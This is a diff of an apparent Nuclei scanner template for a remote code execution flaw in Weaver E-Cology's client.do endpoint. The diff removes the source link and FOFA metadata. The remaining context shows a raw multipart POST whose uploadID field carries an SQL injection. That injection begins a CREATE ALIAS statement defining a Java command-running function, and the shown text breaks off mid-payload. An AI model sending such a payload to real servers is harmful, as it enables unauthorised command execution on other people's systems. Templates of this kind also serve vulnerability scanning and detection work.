@@ -3,12 +3,8 @@ info:
   name: 泛微E-Cology client.do RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgau0bdylocrw8pu'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mgau0bdylocrw8pu
-    fofa: app="泛微-EMobile"
 http:
 - raw:
   - 'POST /client.do HTTP/1.1
@@ -32,14 +28,10 @@ http:
     Content-Length: 1151
 
 
-
-
     ------HJGJjgvfIUGVYHVvfytfvkgvuy
 
 
     Content-Disposition: form-data; name="method"
-
-
 
 
     getupload
@@ -49,8 +41,6 @@ http:
 
 
     Content-Disposition: form-data; name="uploadID"
-
-
 
 
     1'';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT(''void e(String cmd) throws
